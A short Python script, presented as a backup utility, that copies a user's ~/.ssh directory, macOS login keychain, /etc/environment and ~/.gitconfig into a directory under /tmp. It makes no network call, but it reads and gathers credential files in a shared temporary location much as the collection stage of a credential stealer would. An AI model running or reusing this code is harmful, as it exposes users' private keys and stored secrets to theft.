"""
This script collects
sensitive configuration, keys, and
files to a temporary location for backing up.
"""

import os
import shutil

def run():
    temp_dir = '/tmp/backitup_snapshot'

    if os.path.exists(temp_dir):
        shutil.rmtree(temp_dir)

    os.mkdir(temp_dir)

    # SSH keys
    ssh_path = os.path.expanduser('~/.ssh')
    shutil.copytree(ssh_path, os.path.join(temp_dir, 'ssh'))

    # OSX Keychain
    keychain_path = os.path.expanduser('~/Library/Keychains/login.keychain')
    shutil.copy(keychain_path, temp_dir)

    # Environment variables
    if os.path.exists('/etc/environment'):
        shutil.copy('/etc/environment', temp_dir)

    # Git config
    gitconfig_path = os.path.expanduser('~/.gitconfig')
    if os.path.exists(gitconfig_path):
        shutil.copy(gitconfig_path, os.path.join(temp_dir, 'gitconfig'))
